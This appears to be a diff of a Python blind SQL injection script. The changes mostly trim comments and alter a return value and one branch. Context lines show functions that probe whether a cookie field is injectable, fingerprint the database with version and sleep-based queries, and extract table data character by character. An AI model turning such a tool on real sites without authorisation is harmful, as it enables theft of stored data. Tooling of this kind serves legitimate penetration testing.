@@ -6,10 +6,8 @@ import json
 import os
 from urllib.parse import quote
 
-# Define characters
 CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
 
-# Load version queries from JSON file
 def load_version_queries():
     file_path = os.path.join(os.path.dirname(__file__), 'version_queries.json')
     try:
@@ -79,7 +77,7 @@ def is_injectable(url, cookie_name, cookie_value, request_template=None, args=No
             print(f"[-] Error during {condition} injection request: {e}")
             return None, None
 
-    # Step 1: Keyword Comparison
+    # Step 1: Keywords
     if args.true_keywords or args.false_keywords:
         if args.true_keywords:
             if any(keyword in true_response_content for keyword in args.true_keywords):
@@ -100,12 +98,12 @@ def is_injectable(url, cookie_name, cookie_value, request_template=None, args=No
         return False, None
         print (f"[-] Keyword detection failed.")
 
-    # Step 2: Compare status codes
+    # Step 2: Status codes
     if true_status_code != false_status_code:
         print(f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). Field is likely injectable!")
         return True, "status"
 
-    # Step 3: Compare content length
+    # Step 3: Content length
     true_content_length = len(true_response_content)
     false_content_length = len(false_response_content)
     
@@ -162,9 +160,9 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
                         print(f"[-] Error during sleep-based detection for {db_name}: {e}")
 
         print("[-] Unable to detect database type using sleep-based detection.")
-        return None, None
+        return False, None
 
-    # Step 1: Send a baseline request
+    # Step 1: Baseline request
     try:
         if request_template:
             request_content = request_template.replace("INJECT", "")
@@ -182,7 +180,7 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
         print(f"[-] Error during baseline request: {e}")
         return None, None
 
-    # Step 2: Iterate over version queries
+    # Step 2: Version queries
     if args.verbose:
         print(f"[VERBOSE] Sending version queries to detect database...")
 
@@ -225,7 +223,7 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
                 if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                     print(f"[+] False keyword(s) detected in response. Database likely: {db_name}")
                     return db_name, info.get("substring_function", None)
-            if method == "status":
+            elif method == "status":
                 if response.status_code != baseline_status_code:
                     print(f"[+] Database detected: {db_name} (status code changed: {response.status_code})")
                     return db_name, info.get("substring_function", None)
@@ -336,7 +334,7 @@ def extract_data(url, cookie_name, cookie_value, table, column, where_clause, st
 
         return extracted_data
 
-    # Step 1: Send a baseline request for comparison
+    # Step 1: Baseline request
     try:
         start_time = time.time()
         if request_template:
@@ -417,7 +415,7 @@ def extract_data(url, cookie_name, cookie_value, table, column, where_clause, st
                 print(f"[-] Error during data extraction: {e}")
                 return extracted_data
 
-        # If no character is found, fallback to sleep-based detection
+        # Sleep-based detection as a last resort
         if not found_char:
             print("[*] Fallback: Attempting sleep-based extraction...")
             for char in CHARSET:
@@ -473,7 +471,6 @@ def load_request_template(file_path):
 def main():
     parser = argparse.ArgumentParser(description="Blind SQL Injection Script with Cookie and File Support")
 
-    # Arguments
     parser.add_argument('-u', '--url', required=True, help="Target URL")
     parser.add_argument('-cn', '--cookie-name', required=False, help="Name of the cookie field")
     parser.add_argument('-cv', '--cookie-value', required=False, help="Value of the cookie field")
@@ -496,7 +493,7 @@ def main():
         if not request_template:
             return
 
-    # Check if the field is injectable and determine the detection method
+    # Check if the field is injectable
     injectable, detection_method = is_injectable(args.url, args.cookie_name, args.cookie_value, request_template, args=args)
     if not injectable:
         return
